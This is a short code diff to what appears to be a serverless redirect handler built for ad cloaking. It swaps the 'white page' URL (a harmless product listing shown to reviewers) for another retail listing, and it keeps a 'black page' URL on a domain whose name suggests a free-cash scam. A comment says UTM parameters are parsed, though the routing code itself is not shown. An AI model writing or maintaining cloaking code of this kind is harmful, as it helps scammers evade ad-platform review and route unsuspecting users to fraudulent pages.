@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/super-solu-hundebuggy-klappbarer-hundewagen-mit-netzfenstern-fuer-hunde-bis-36-kg-haustierwagen-fuer-mittelgrosse-hunde-p05-1-tlg-dunkelgruen-pet-stroller-feststellbremse-leicht-und-robust-S08FH0UO/";
+    const whitePageURL = "https://logitech.onlinesalestore.pk/products/logitech-g102-gaming-mouse?variant=39548689711175";
     const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
